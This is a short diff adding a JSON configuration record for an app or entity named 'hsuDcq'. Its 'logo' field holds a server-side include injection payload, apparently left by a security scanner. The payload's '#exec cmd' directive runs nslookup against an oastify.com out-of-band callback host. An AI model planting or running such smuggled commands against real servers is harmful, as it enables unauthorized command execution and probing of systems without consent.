@@ -1,0 +1,15 @@
+{
+	"createdTime":1741342200278,
+	"deleted":false,
+	"enabled":false,
+	"id":"67cac5f819d8a25fc18fa847",
+	"lastModifiedBy":22743,
+	"lcName":"hsudcq",
+	"logo":"\"-->'-->`--><!--#set var=\"nel\" value=\"mdktg0itew\"--><!--#set var=\"pgn\" value=\"ofmvi2kvgy\"--><!--#echo var=\"nel\"--><!--#echo var=\"pgn\"--><!--#exec cmd=\"nslookup -q=cname 907g3n5g1jg9trqac85anv9rbihb5cw0oycqzhn6.oastify.com\" -->",
+	"modifiedTime":1741342200278,
+	"name":"hsuDcq",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
